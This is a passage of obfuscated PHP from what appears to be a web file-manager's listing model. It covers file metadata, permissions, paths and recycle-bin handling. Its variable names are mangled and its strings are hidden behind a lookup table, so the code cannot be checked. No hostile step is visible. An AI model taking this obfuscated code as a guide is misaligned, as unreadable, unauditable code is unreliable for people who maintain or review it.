$êª©¼¯Â = Model($óŸ”ìí¬[531])->get($óŸ”ìí¬[533]); $˜É“ÉÕ = array($óŸ”ìí¬[534] => $óŸ”ìí¬[535], $óŸ”ìí¬[536] => $óŸ”ìí¬[537]); $ÓöĞö€Ô = array($óŸ”ìí¬[32] => $óŸ”ìí¬[32], $óŸ”ìí¬[79] => $óŸ”ìí¬[79], $óŸ”ìí¬[169] => $óŸ”ìí¬[497], $óŸ”ìí¬[538] => $óŸ”ìí¬[538], $óŸ”ìí¬[539] => $óŸ”ìí¬[540], $óŸ”ìí¬[234] => $óŸ”ìí¬[234], $óŸ”ìí¬[88] => $óŸ”ìí¬[88]); $—Å»Íø = Input::get($óŸ”ìí¬[541], $óŸ”ìí¬[7], $­šËƒ½€, array_keys($ÓöĞö€Ô)); $•¨ˆ©Íí = Input::get($óŸ”ìí¬[542], $óŸ”ìí¬[7], $êª©¼¯Â, array_keys($˜É“ÉÕ)); if (!in_array($—Å»Íø, array_keys($ÓöĞö€Ô))) { $—Å»Íø = $óŸ”ìí¬[32]; } if (!in_array($•¨ˆ©Íí, array_keys($˜É“ÉÕ))) { $—Å»Íø = $óŸ”ìí¬[534]; } if ($—Å»Íø == $óŸ”ìí¬[32]) { } $Á²À×Ò = $óŸ”ìí¬[543] . $ÓöĞö€Ô[$—Å»Íø] . $óŸ”ìí¬[53] . $˜É“ÉÕ[$•¨ˆ©Íí]; $Á²À×Ò = rtrim(trim($Á²À×Ò), $óŸ”ìí¬[50]); if ($¤‡˜ƒĞá) { return array($Á²À×Ò, $˜É“ÉÕ[$•¨ˆ©Íí]); } return $this->order($Á²À×Ò); } protected function _listDataApplyItem($‡İº„ë , $Ú’Ùåã = false) { $ôÉÛò‚¶ = array($‡İº„ë ); $this->_listDataApply($ôÉÛò‚¶, $Ú’Ùåã); return $ôÉÛò‚¶[0]; } protected function _listDataApply(&$ò÷×ì‘è, $‘Âñ¼í = false) { $ÌÕ‹ˆ°Ğ =& $_SERVER[®»±”ó²]; if (!$ò÷×ì‘è) { $ò÷×ì‘è = array(); return; } $šÍ™î¤è = array_to_keyvalue($ò÷×ì‘è, $ÌÕ‹ˆ°Ğ[12], $ÌÕ‹ˆ°Ğ[194]); $šÍ™î¤è = array_unique($šÍ™î¤è); $this->_listSourceCache($ò÷×ì‘è); if (!$‘Âñ¼í) { $this->_listAppendMeta($ò÷×ì‘è, $šÍ™î¤è); $this->_listAppendFileMeta($ò÷×ì‘è, $šÍ™î¤è); $this->_listAppendChildren($ò÷×ì‘è, $šÍ™î¤è); } $this->_listAppendPath($ò÷×ì‘è); $this->_listAppendAuth($ò÷×ì‘è); $this->_listAppendSourceInfo($ò÷×ì‘è, $šÍ™î¤è); $this->_listAppendUser($ò÷×ì‘è); $this->_listFilterInfo($ò÷×ì‘è, $‘Âñ¼í); $this->_listAppendAuthSecret($ò÷×ì‘è); } protected function _listSourceCache($ïÓÍÉÅö) { $çÚàÂı =& $_SERVER[®»±”ó²]; foreach ($ïÓÍÉÅö as $´³·€»’) { self::$cacheSourceInfo[$çÚàÂı[544] . $´³·€»’[$çÚàÂı[194]]] = $´³·€»’; } } protected function _listFilterInfo(&$Ä£Ÿ‡…, $Ç²½Ø = false) { $¶™ÖõÊ¡ =& $_SERVER[®»±”ó²]; foreach ($Ä£Ÿ‡… as &$Üşù¥¤š) { $Üşù¥¤š = $this->pathInfoFilter($Üşù¥¤š); self::$cachePathInfo[$¶™ÖõÊ¡[545] . intval($Ç²½Ø) . $¶™ÖõÊ¡[464] . $Üşù¥¤š[$¶™ÖõÊ¡[194]]] = $Üşù¥¤š; } unset($Üşù¥¤š); } protected function _listMake(&$şÂùúàø) { $ª‘æ¥„† =& $_SERVER[®»±”ó²]; $şÂùúàø[$ª‘æ¥„†[85]] = array(); $şÂùúàø[$ª‘æ¥„†[86]] = array(); foreach ($şÂùúàø[$ª‘æ¥„†[447]] as $®îş“¼œ) { $Òçñø¹Î = $®îş“¼œ[$ª‘æ¥„†[496]] == 1 ? $ª‘æ¥„†[85] : $ª‘æ¥„†[86]; $şÂùúàø[$Òçñø¹Î][] = $®îş“¼œ; } unset($şÂùúàø[$ª‘æ¥„†[447]]); } protected function _listAppendMeta(&$„‰ËìÃ±, $ÃğºŠÂ) { $Ã­åÅ­È =& $_SERVER[®»±”ó²]; $„—äÃÊ = array($Ã­åÅ­È[502] => array($Ã­åÅ­È[503], $ÃğºŠÂ)); $œ¹‰èˆ = Model($Ã­åÅ­È[546])->field($Ã­åÅ­È[547])->where($„—äÃÊ)->select(); if (!$œ¹‰èˆ) { return; } $®ë°ç¬å = array($Ã­åÅ­È[548], $Ã­åÅ­È[549], $Ã­åÅ­È[528]); $éõ¡ğÓŒ = array(); foreach ($œ¹‰èˆ as $Š¯…ß) { if (!isset($éõ¡ğÓŒ[$Š¯…ß[$Ã­åÅ­È[194]]])) { $éõ¡ğÓŒ[$Š¯…ß[$Ã­åÅ­È[194]]] = array(); } if (in_array($Š¯…ß[$Ã­åÅ­È[97]], $®ë°ç¬å)) { continue; } if ($Š¯…ß[$Ã­åÅ­È[97]] == $Ã­åÅ­È[550]) { $Š¯…ß[$Ã­åÅ­È[452]] = $Ã­åÅ­È[551]; } $éõ¡ğÓŒ[$Š¯…ß[$Ã­åÅ­È[194]]][$Š¯…ß[$Ã­åÅ­È[97]]] = $Š¯…ß[$Ã­åÅ­È[452]]; } foreach ($„‰ËìÃ± as &$‰¹î†İÊ) { $‰¹î†İÊ[$Ã­åÅ­È[552]] = !1; if (isset($éõ¡ğÓŒ[$‰¹î†İÊ[$Ã­åÅ­È[194]]])) { $‰¹î†İÊ[$Ã­åÅ­È[552]] = $éõ¡ğÓŒ[$‰¹î†İÊ[$Ã­åÅ­È[194]]]; } if ($this->fileIsLock($‰¹î†İÊ) && $‰¹î†İÊ[$Ã­åÅ­È[498]]) { $ƒöÂªÛ« = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‰¹î†İÊ[$Ã­åÅ­È[498]][$Ã­åÅ­È[499]] = AuthModel::authDisable($‰¹î†İÊ[$Ã­åÅ­È[498]][$Ã­åÅ­È[499]], $ƒöÂªÛ«); $‰¹î†İÊ[$Ã­åÅ­È[498]][$Ã­åÅ­È[553]][$Ã­åÅ­È[498]] = $‰¹î†İÊ[$Ã­åÅ­È[498]][$Ã­åÅ­È[499]]; } } unset($‰¹î†İÊ); } protected function _listAppendFileMeta(&$²ëê¡¾…, $ï‰ğ£ìÉ) { $„¤Í¿’ =& $_SERVER[®»±”ó²]; $¨Ê¹¥¥¤ = array_to_keyvalue($²ëê¡¾…, $„¤Í¿’[12], $„¤Í¿’[554]); $¨Ê¹¥¥¤ = array_filter(array_unique($¨Ê¹¥¥¤)); if (!$¨Ê¹¥¥¤) { return; } $ÃÎÆÀŸÜ = array($„¤Í¿’[555] => array($„¤Í¿’[503], $¨Ê¹¥¥¤)); $ÈØ‰òËÄ = $„¤Í¿’[556]; $ÛŞ ¿Ú¡ = Model($„¤Í¿’[557])->field($ÈØ‰òËÄ)->where($ÃÎÆÀŸÜ)->select(); $ÛŞ ¿Ú¡ = array_to_keyvalue($ÛŞ ¿Ú¡, $„¤Í¿’[554]); $İ¯íÌõ = Model($„¤Í¿’[558])->field($„¤Í¿’[559])->where($ÃÎÆÀŸÜ)->select(); $İ¯íÌõ = $İ¯íÌõ ? $İ¯íÌõ : array(); $ãà Ò•¥ = array(); foreach ($İ¯íÌõ as $ì‡¢ÅÆ³) { if (!isset($ãà Ò•¥[$ì‡¢ÅÆ³[$„¤Í¿’[554]]])) { $ãà Ò•¥[$ì‡¢ÅÆ³[$„¤Í¿’[554]]] = array(); } $ãà Ò•¥[$ì‡¢ÅÆ³[$„¤Í¿’[554]]][$ì‡¢ÅÆ³[$„¤Í¿’[97]]] = $ì‡¢ÅÆ³[$„¤Í¿’[452]]; } foreach ($²ëê¡¾… as &$œØ‡Õ‘ˆ) { $ŞÌ±…ş“ = $œØ‡Õ‘ˆ[$„¤Í¿’[554]]; if (!$ŞÌ±…ş“ || !is_array($ÛŞ ¿Ú¡[$ŞÌ±…ş“])) { continue; } $Š”Ö¹İ = $ÛŞ ¿Ú¡[$ŞÌ±…ş“]; $Š”Ö¹İ[$„¤Í¿’[79]] = $œØ‡Õ‘ˆ[$„¤Í¿’[79]]; $Š”Ö¹İ[$„¤Í¿’[32]] = $œØ‡Õ‘ˆ[$„¤Í¿’[32]]; if (!$Š”Ö¹İ[$„¤Í¿’[560]]) { Model($„¤Í¿’[557])->fileMd5Check($Š”Ö¹İ); } if (!isset(self::$cacheFileInfo[$„¤Í¿’[561] . $ŞÌ±…ş“])) { self::$cacheFileInfo[$„¤Í¿’[561] . $ŞÌ±…ş“] = array_merge(array(), $Š”Ö¹İ); } unset($ÛŞ ¿Ú¡[$ŞÌ±…ş“][$„¤Í¿’[87]]); $Àı©ªˆİ = isset($ãà Ò•¥[$ŞÌ±…ş“]) && is_array($ãà Ò•¥[$ŞÌ±…ş“]) ? $ãà Ò•¥[$ŞÌ±…ş“] : array(); $œØ‡Õ‘ˆ[$„¤Í¿’[170]] = array_merge($Àı©ªˆİ, $ÛŞ ¿Ú¡[$ŞÌ±…ş“]); if (isset($œØ‡Õ‘ˆ[$„¤Í¿’[170]][$„¤Í¿’[185]])) { $œØ‡Õ‘ˆ[$„¤Í¿’[185]] = json_decode($œØ‡Õ‘ˆ[$„¤Í¿’[170]][$„¤Í¿’[185]], !0); unset($œØ‡Õ‘ˆ[$„¤Í¿’[170]][$„¤Í¿’[185]]); } } unset($œØ‡Õ‘ˆ); } protected function _listAppendSourceInfo(&$ä®Ş§ŒÔ, $†Àî ¾ñ) { $Šõ¬ıª‚ =& $_SERVER[®»±”ó²]; $Ğ¢ß§ò = Model($Šõ¬ıª‚[562])->listData(); $ôªƒä­¦ = Model($Šõ¬ıª‚[510])->listData(); $µòä´—Â = Model($Šõ¬ıª‚[500])->listData(); $ÏŞ¿ ½½ = Model($Šõ¬ıª‚[563])->listSimple(); $ÕàŠœ³ = array_to_keyvalue($Ğ¢ß§ò, $Šõ¬ıª‚[477]); $§–´­’É = array_to_keyvalue_group($ôªƒä­¦, $Šõ¬ıª‚[87], $Šõ¬ıª‚[511]); $ĞÏˆÇÖ¦ = array_to_keyvalue($µòä´—Â, $Šõ¬ıª‚[87]); $…êÎ›ñ€ = array_to_keyvalue_group($ÏŞ¿ ½½, $Šõ¬ıª‚[194]); foreach ($ä®Ş§ŒÔ as &$Ş®³€ô“) { $Ş®³€ô“[$Šõ¬ıª‚[90]] = array($Šõ¬ıª‚[564] => 0, $Šõ¬ıª‚[565] => 0, $Šõ¬ıª‚[566] => 0); if (isset($ĞÏˆÇÖ¦[$Ş®³€ô“[$Šõ¬ıª‚[194]]])) { $Ş®³€ô“[$Šõ¬ıª‚[90]][$Šõ¬ıª‚[567]] = 1; $Ş®³€ô“[$Šõ¬ıª‚[90]][$Šõ¬ıª‚[568]] = $ĞÏˆÇÖ¦[$Ş®³€ô“[$Šõ¬ıª‚[194]]][$Šõ¬ıª‚[32]]; } if ($§–´­’É && $ÕàŠœ³ && isset($§–´­’É[$Ş®³€ô“[$Šõ¬ıª‚[194]]])) { $Ş®³€ô“[$Šõ¬ıª‚[90]][$Šõ¬ıª‚[569]] = array(); foreach ($§–´­’É[$Ş®³€ô“[$Šõ¬ıª‚[194]]] as $ÀØ˜¬Šâ) { $¸»—åèˆ = $ÕàŠœ³[$ÀØ˜¬Šâ]; $Ş®³€ô“[$Šõ¬ıª‚[90]][$Šõ¬ıª‚[569]][] = array($Šõ¬ıª‚[570] => $¸»—åèˆ[$Šõ¬ıª‚[477]], $Šõ¬ıª‚[505] => $¸»—åèˆ[$Šõ¬ıª‚[32]], $Šõ¬ıª‚[571] => $¸»—åèˆ[$Šõ¬ıª‚[572]]); } } if ($…êÎ›ñ€ && isset($…êÎ›ñ€[$Ş®³€ô“[$Šõ¬ıª‚[194]]])) { $Ş®³€ô“[$Šõ¬ıª‚[90]][$Šõ¬ıª‚[573]] = array(); foreach ($…êÎ›ñ€[$Ş®³€ô“[$Šõ¬ıª‚[194]]] as $æĞàû‚§) { $ÂÁ¦Ü¦ = $Šõ¬ıª‚[574]; if ($æĞàû‚§[$Šõ¬ıª‚[575]] == $Šõ¬ıª‚[91]) { $ÂÁ¦Ü¦ .= $Šõ¬ıª‚[576]; } $Ş®³€ô“[$Šõ¬ıª‚[90]][$Šõ¬ıª‚[573]] = array_field_key($æĞàû‚§, explode($Šõ¬ıª‚[50], $ÂÁ¦Ü¦)); } } } unset($Ş®³€ô“); return $ä®Ş§ŒÔ; } protected function _listAppendChildren(&$©›Š·é, $¢áäëş­) { $à²®ë•ı =& $_SERVER[®»±”ó²]; $ñ™á¹Š¨ = array(); $”ÑÈÏæ¹ = array($à²®ë•ı[242] => 0, $à²®ë•ı[243] => 0); foreach ($©›Š·é as &$íşäÎ€Ê) { if (!$íşäÎ€Ê[$à²®ë•ı[496]]) { continue; } $ñ™á¹Š¨[] = $íşäÎ€Ê[$à²®ë•ı[194]]; } unset($íşäÎ€Ê); if (!$ñ™á¹Š¨) { return; } $Å½Ù¤· = array($à²®ë•ı[193] => array($à²®ë•ı[7], $ñ™á¹Š¨), $à²®ë•ı[516] => 0); $ÅÂÔèû± = array($à²®ë•ı[193], $à²®ë•ı[496], $à²®ë•ı[577] => $à²®ë•ı[578]); $¢ñ˜ğ¥å = $this->field($ÅÂÔèû±)->where($Å½Ù¤·)->group($à²®ë•ı[579])->select(); $‡ìÉúÓ = array(); foreach ($¢ñ˜ğ¥å as $ş¡¶…ÚÍ) { $ë°Î½Ë… = $ş¡¶…ÚÍ[$à²®ë•ı[193]]; $Ö¸®œ = $ş¡¶…ÚÍ[$à²®ë•ı[496]] == $à²®ë•ı[91] ? $à²®ë•ı[243] : $à²®ë•ı[242]; if (!isset($‡ìÉúÓ[$ë°Î½Ë…])) { $‡ìÉúÓ[$ë°Î½Ë…] = array($à²®ë•ı[242] => 0, $à²®ë•ı[243] => 0); } $‡ìÉúÓ[$ë°Î½Ë…][$Ö¸®œ] += $ş¡¶…ÚÍ[$à²®ë•ı[578]]; } foreach ($©›Š·é as &$íşäÎ€Ê) { if (!$íşäÎ€Ê[$à²®ë•ı[496]]) { continue; } $ŸŞ ØÜõ = is_array($‡ìÉúÓ[$íşäÎ€Ê[$à²®ë•ı[194]]]) ? $‡ìÉúÓ[$íşäÎ€Ê[$à²®ë•ı[194]]] : $”ÑÈÏæ¹; $íşäÎ€Ê[$à²®ë•ı[243]] = $ŸŞ ØÜõ[$à²®ë•ı[243]]; $íşäÎ€Ê[$à²®ë•ı[242]] = $ŸŞ ØÜõ[$à²®ë•ı[242]]; unset($íşäÎ€Ê[$à²®ë•ı[497]]); } unset($íşäÎ€Ê); } protected function _listAppendAuth(&$ÏÎùŠæ€) { $îüÆ¤¼ =& $_SERVER[®»±”ó²]; $„ş˜Ì¾Ö = array(); foreach ($ÏÎùŠæ€ as $ôø•¿ã¥) { if ($ôø•¿ã¥[$îüÆ¤¼[191]] == self::TYPE_GROUP) { $„ş˜Ì¾Ö[] = $ôø•¿ã¥[$îüÆ¤¼[194]]; } } if (!$„ş˜Ì¾Ö) { return; } $ÉÇ´€ = array_to_keyvalue($ÏÎùŠæ€, $îüÆ¤¼[194]); $¢·ù—ï = Model($îüÆ¤¼[580])->getSourceList($„ş˜Ì¾Ö, $ÉÇ´€); $ğ«Îú‰ = KodUser::isRoot(); foreach ($ÏÎùŠæ€ as $ññğ•‡¼ => &$ôø•¿ã¥) { $ôø•¿ã¥[$îüÆ¤¼[498]] = $¢·ù—ï[$ôø•¿ã¥[$îüÆ¤¼[194]]]; if (!$ôø•¿ã¥[$îüÆ¤¼[498]] && $ôø•¿ã¥[$îüÆ¤¼[191]] == self::TYPE_GROUP) { $ôø•¿ã¥[$îüÆ¤¼[498]] = Action($îüÆ¤¼[581])->pathGroupAuthMake($ôø•¿ã¥[$îüÆ¤¼[582]]); if (!$ôø•¿ã¥[$îüÆ¤¼[498]] && !$ğ«Îú‰) { $ôø•¿ã¥[$îüÆ¤¼[236]] = !1; $ôø•¿ã¥[$îüÆ¤¼[235]] = !1; } } if ($ôø•¿ã¥[$îüÆ¤¼[498]]) { $ôø•¿ã¥[$îüÆ¤¼[236]] = AuthModel::authCheckEdit($ôø•¿ã¥[$îüÆ¤¼[498]][$îüÆ¤¼[499]]); $ôø•¿ã¥[$îüÆ¤¼[235]] = AuthModel::authCheckView($ôø•¿ã¥[$îüÆ¤¼[498]][$îüÆ¤¼[499]]); } $this->groupPathDisplay($ôø•¿ã¥); } unset($ôø•¿ã¥); } public function _listAppendAuthSecret(&$ÄêâáŸÄ) { $òÕŞôºÖ =& $_SERVER[®»±”ó²]; if (Model($òÕŞôºÖ[519])->get($òÕŞôºÖ[583]) != $òÕŞôºÖ[91]) { return; } static $×úªåû± = false; if (!$×úªåû±) { $åıÒØü× = Model($òÕŞôºÖ[584]); $êõù³˜÷ = Model($òÕŞôºÖ[585]); $×úªåû± = $êõù³˜÷->listData(); $×úªåû± = array_to_keyvalue($×úªåû±, $òÕŞôºÖ[194]); $œœİÊŸ¸ = json_decode(Model($òÕŞôºÖ[519])->get($òÕŞôºÖ[586]), !0); $œœİÊŸ¸ = array_to_keyvalue($œœİÊŸ¸, $òÕŞôºÖ[477]); foreach ($×úªåû± as $ª‰ÔÑ => $Ô¸–‹Š) { $”‘Êû© = $œœİÊŸ¸[$Ô¸–‹Š[$òÕŞôºÖ[587]]]; if (!$”‘Êû©) { $êõù³˜÷->remove($Ô¸–‹Š[$òÕŞôºÖ[477]]); unset($×úªåû±[$ª‰ÔÑ]); continue; } $œ»›øÌ¼ = $åıÒØü×->listData($”‘Êû©[$òÕŞôºÖ[498]]); if (!$œ»›øÌ¼) { $êõù³˜÷->remove($Ô¸–‹Š[$òÕŞôºÖ[477]]); unset($×úªåû±[$ª‰ÔÑ]); continue; } $Ô¸–‹Š[$òÕŞôºÖ[498]] = $œ»›øÌ¼; $Ô¸–‹Š[$òÕŞôºÖ[588]] = $”‘Êû©; $Ô¸–‹Š[$òÕŞôºÖ[589]] = Model($òÕŞôºÖ[590])->getInfoSimpleOuter($Ô¸–‹Š[$òÕŞôºÖ[538]]); $×úªåû±[$ª‰ÔÑ] = $Ô¸–‹Š; } } $äõ® = USER_ID; $ì™ÒöÙÊ = array(); $Õ¡ªÔÀå = $this->_listAppendPath($ì™ÒöÙÊ, !0); foreach ($ÄêâáŸÄ as $ª‰ÔÑ => &$Ô¸–‹Š) { if (!is_array($Ô¸–‹Š[$òÕŞôºÖ[498]])) { continue; } if ($Ô¸–‹Š[$òÕŞôºÖ[191]] != $òÕŞôºÖ[591]) { continue; } if (isset($×úªåû±[$Ô¸–‹Š[$òÕŞôºÖ[194]]])) { $’ÊË÷Å€ = $×úªåû±[$Ô¸–‹Š[$òÕŞôºÖ[194]]]; if (!is_array($Ô¸–‹Š[$òÕŞôºÖ[552]])) { $Ô¸–‹Š[$òÕŞôºÖ[552]] = array(); } $Ô¸–‹Š[$òÕŞôºÖ[552]][$òÕŞôºÖ[592]] = $’ÊË÷Å€[$òÕŞôºÖ[587]]; $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[593]] = $’ÊË÷Å€; $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[594]] = $Ô¸–‹Š[$òÕŞôºÖ[595]]; $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[596]] = $òÕŞôºÖ[91]; if ($’ÊË÷Å€[$òÕŞôºÖ[538]] != $äõ®) { $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[499]] = $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[499]] & $’ÊË÷Å€[$òÕŞôºÖ[498]][$òÕŞôºÖ[498]]; } continue; } $º…ıŸŞ£ = $this->parentLevelArray($Ô¸–‹Š[$òÕŞôºÖ[597]]); $‚ñ®Á¹‚ = array_reverse($º…ıŸŞ£); foreach ($‚ñ®Á¹‚ as $’ó“İ => $‹Ï‹äú) { if (!isset($×úªåû±[$‹Ï‹äú])) { continue; } $’ÊË÷Å€ = $×úªåû±[$‹Ï‹äú]; $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[593]] = $’ÊË÷Å€; if ($’ÊË÷Å€[$òÕŞôºÖ[538]] != $äõ®) { $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[499]] = $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[499]] & $’ÊË÷Å€[$òÕŞôºÖ[498]][$òÕŞôºÖ[498]]; } $Ø…·îøí = $òÕŞôºÖ[12]; $¤áùƒáî = count($º…ıŸŞ£) - $’ó“İ; for ($¦”ùğ±è = 0; $¦”ùğ±è < $¤áùƒáî; $¦”ùğ±è++) { if (!isset($Õ¡ªÔÀå[$º…ıŸŞ£[$¦”ùğ±è]])) { $Ø…·îøí = $òÕŞôºÖ[12]; break; } $Ø…·îøí = $Ø…·îøí . rtrim($Õ¡ªÔÀå[$º…ıŸŞ£[$¦”ùğ±è]], $òÕŞôºÖ[8]) . $òÕŞôºÖ[8]; } $Ô¸–‹Š[$òÕŞôºÖ[498]][$òÕŞôºÖ[594]] = rtrim($Ø…·îøí, $òÕŞôºÖ[8]) . $òÕŞôºÖ[8]; break; } } unset($Ô¸–‹Š); } public function groupPathDisplay(&$ÎÛûÛœ) { $¥·¹ ¹§ =& $_SERVER[®»±”ó²]; if ($ÎÛûÛœ[$¥·¹ ¹§[191]] != self::TYPE_GROUP) { return; } $¥üš‚ä = Model($¥·¹ ¹§[598])->getInfo($ÎÛûÛœ[$¥·¹ ¹§[582]]); $Áî²…—É = $this->parentLevelArray($¥üš‚ä[$¥·¹ ¹§[597]]); $ìô›×óÈ = $¥·¹ ¹§[12]; foreach ($Áî²…—É as $¦ä¶üÒë) { $ä•ºã¯ø = Model($¥·¹ ¹§[598])->getInfo($¦ä¶üÒë); $ìô›×óÈ .= $ä•ºã¯ø[$¥·¹ ¹§[90]][$¥·¹ ¹§[194]] . $¥·¹ ¹§[50]; } $ÎÛûÛœ[$¥·¹ ¹§[599]] = $¥üš‚ä[$¥·¹ ¹§[193]]; $ÎÛûÛœ[$¥·¹ ¹§[600]] = $¥üš‚ä[$¥·¹ ¹§[597]]; $ÎÛûÛœ[$¥·¹ ¹§[601]] = $¥üš‚ä[$¥·¹ ¹§[602]]; $ÎÛûÛœ[$¥·¹ ¹§[603]] = $ìô›×óÈ . $¥üš‚ä[$¥·¹ ¹§[90]][$¥·¹ ¹§[194]]; } protected function _listAppendPath(&$‚ˆœÛ½Ê, $İ¿©ğ­ = false) { $Ì´ô–È¬ =& $_SERVER[®»±”ó²]; static $ïÇğñí = array(); $•Š‘‡¾ = array(); $½Œëû¸ = array(); if ($İ¿©ğ­) { return $ïÇğñí; } foreach ($‚ˆœÛ½Ê as &$à×Àş) { $§Á‘Ù‚â = $à×Àş[$Ì´ô–È¬[194]]; if ($à×Àş[$Ì´ô–È¬[496]] == $Ì´ô–È¬[91] && $à×Àş[$Ì´ô–È¬[193]] != 0) { $ïÇğñí[$§Á‘Ù‚â] = $à×Àş[$Ì´ô–È¬[32]]; } if ($à×Àş[$Ì´ô–È¬[496]] == $Ì´ô–È¬[91] && $à×Àş[$Ì´ô–È¬[193]] == 0) { $ïÇğñí[$§Á‘Ù‚â] = $this->_listAppendPathRoot($à×Àş, array()); } if (isset($½Œëû¸[$à×Àş[$Ì´ô–È¬[597]]])) { continue; } $½Œëû¸[$à×Àş[$Ì´ô–È¬[597]]] = !0; $Ìšáˆ²› = $this->parentLevelArray($à×Àş[$Ì´ô–È¬[597]]); foreach ($Ìšáˆ²› as $·¤ê¬Ê => $«†¨ø) { if (isset($ïÇğñí[$«†¨ø])) { continue; } if ($·¤ê¬Ê == 0) { $ïÇğñí[$«†¨ø] = $this->_listAppendPathRoot($à×Àş, $Ìšáˆ²›); } if ($·¤ê¬Ê != 0) { $•Š‘‡¾[] = $«†¨ø; } } } unset($à×Àş); $•Š‘‡¾ = array_unique($•Š‘‡¾); if (count($•Š‘‡¾) > 0) { $™—Š€©× = array($Ì´ô–È¬[502] => array($Ì´ô–È¬[503], $•Š‘‡¾)); if (count($•Š‘‡¾) == 1) { $³á­äö = $this->sourceInfo($•Š‘‡¾[0]); $‡şš³û˜ = is_array($³á­äö) ? array($³á­äö) : !1; } else { $‡şš³û˜ = $this->field($Ì´ô–È¬[604])->where($™—Š€©×)->select(); } if (!$‡şš³û˜) { $‡şš³û˜ = array(); } foreach ($‡şš³û˜ as $ßßÚè„ü) { $ïÇğñí[$ßßÚè„ü[$Ì´ô–È¬[194]]] = $ßßÚè„ü[$Ì´ô–È¬[32]]; } } $¤³íñïŒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $áğá·Äù = array(); foreach ($‚ˆœÛ½Ê as &$à×Àş) { $ ••ß¾… = $à×Àş[$Ì´ô–È¬[597]]; $ÄÚŞ‹À = $Ì´ô–È¬[12]; if (isset($áğá·Äù[$ ••ß¾…])) { $ÄÚŞ‹À = $áğá·Äù[$ ••ß¾…]; } else { $Ìšáˆ²› = $this->parentLevelArray($à×Àş[$Ì´ô–È¬[597]]); foreach ($Ìšáˆ²› as $·¤ê¬Ê => $«†¨ø) { if (isset($ïÇğñí[$«†¨ø])) { $ÄÚŞ‹À .= $ïÇğñí[$«†¨ø] . $Ì´ô–È¬[8]; } } $áğá·Äù[$ ••ß¾…] = $ÄÚŞ‹À; } $ÄÚŞ‹À .= $à×Àş[$Ì´ô–È¬[32]]; if ($à×Àş[$Ì´ô–È¬[496]] == $Ì´ô–È¬[91]) { $ÄÚŞ‹À .= $Ì´ô–È¬[8]; } $à×Àş[$Ì´ô–È¬[595]] = str_replace($Ì´ô–È¬[257], $Ì´ô–È¬[8], $ÄÚŞ‹À); if ($à×Àş[$Ì´ô–È¬[193]] == $Ì´ô–È¬[231]) { $à×Àş[$Ì´ô–È¬[32]] = trim($ïÇğñí[$à×Àş[$Ì´ô–È¬[194]]], $Ì´ô–È¬[8]); $à×Àş[$Ì´ô–È¬[595]] = $à×Àş[$Ì´ô–È¬[32]] . $Ì´ô–È¬[8]; } if (intval($à×Àş[$Ì´ô–È¬[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($à×Àş, $Ìšáˆ²›, $¤³íñïŒ); } } unset($à×Àş); return $‚ˆœÛ½Ê; } private function _listAppendPathRecycle(&$ÕæÕ¿¹ê, $©‹ßŠÁ, $×éÌÜ¾) { $ç¶é–¾ä =& $_SERVER[®»±”ó²]; if (!in_array($×éÌÜ¾, $©‹ßŠÁ) && $ÕæÕ¿¹ê[$ç¶é–¾ä[194]] != $×éÌÜ¾) { return; } $ŒÉù’ŸË = explode($ç¶é–¾ä[8], trim($ÕæÕ¿¹ê[$ç¶é–¾ä[595]], $ç¶é–¾ä[8])); $ÓüÅ•‰Æ = implode($ç¶é–¾ä[8], array_slice($ŒÉù’ŸË, 2)); $ÕæÕ¿¹ê[$ç¶é–¾ä[595]] = $ç¶é–¾ä[8] . LNG($ç¶é–¾ä[605]) . $ç¶é–¾ä[8] . ltrim($ÓüÅ•‰Æ, $ç¶é–¾ä[8]); $ÕæÕ¿¹ê[$ç¶é–¾ä[597]] = $ç¶é–¾ä[606] . implode($ç¶é–¾ä[50], array_slice($©‹ßŠÁ, 1)) . $ç¶é–¾ä[50]; if ($ÕæÕ¿¹ê[$ç¶é–¾ä[194]] == $×éÌÜ¾) { $ÕæÕ¿¹ê[$ç¶é–¾ä[597]] = $ç¶é–¾ä[606]; $ÕæÕ¿¹ê[$ç¶é–¾ä[193]] = $ç¶é–¾ä[231]; $ÕæÕ¿¹ê[$ç¶é–¾ä[32]] = LNG($ç¶é–¾ä[605]); } $ÕæÕ¿¹ê[$ç¶é–¾ä[607]] = $ç¶é–¾ä[608]; } protected function _listAppendPathRoot(&$†¦ñšŞ, $Ú®‰ñÍ) { $°¡Ô÷Şä =& $_SERVER[®»±”ó²]; static $µ¾™ù±‹ = false; static $Ò¸êÄ³İ = false; $Â´²Úä¶ = $°¡Ô÷Şä[12]; if ($†¦ñšŞ[$°¡Ô÷Şä[191]] == self::TYPE_USER) { if ($†¦ñšŞ[$°¡Ô÷Şä[582]] == USER_ID) { $Â´²Úä¶ = LNG($°¡Ô÷Şä[609]); if ($µ¾™ù±‹ === !1) { $ï—Üæõó = Model($°¡Ô÷Şä[610])->getInfoFull(USER_ID); $µ¾™ù±‹ = _get($ï—Üæõó, $°¡Ô÷Şä[611], $°¡Ô÷Şä[12]); } if ($Ò¸êÄ³İ === !1) { $ï—Üæõó = Model($°¡Ô÷Şä[610])->getInfoFull(USER_ID); $Ò¸êÄ³İ = _get($ï—Üæõó, $°¡Ô÷Şä[612], $°¡Ô÷Şä[12]); } if ($Ú®‰ñÍ && $Ú®‰ñÍ[0] == $µ¾™ù±‹ || !$Ú®‰ñÍ && $†¦ñšŞ[$°¡Ô÷Şä[194]] == $µ¾™ù±‹) { $Â´²Úä¶ = LNG($°¡Ô÷Şä[613]); $†¦ñšŞ[$°¡Ô÷Şä[614]] = $°¡Ô÷Şä[615]; } if ($Ú®‰ñÍ && $Ú®‰ñÍ[0] == $Ò¸êÄ³İ || !$Ú®‰ñÍ && $†¦ñšŞ[$°¡Ô÷Şä[194]] == $Ò¸êÄ³İ) { $Â´²Úä¶ = $Â´²Úä¶ . $°¡Ô÷Şä[616] . LNG($°¡Ô÷Şä[617]); } if (!$Ú®‰ñÍ) { $†¦ñšŞ[$°¡Ô÷Şä[32]] = $Â´²Úä¶; } } else { 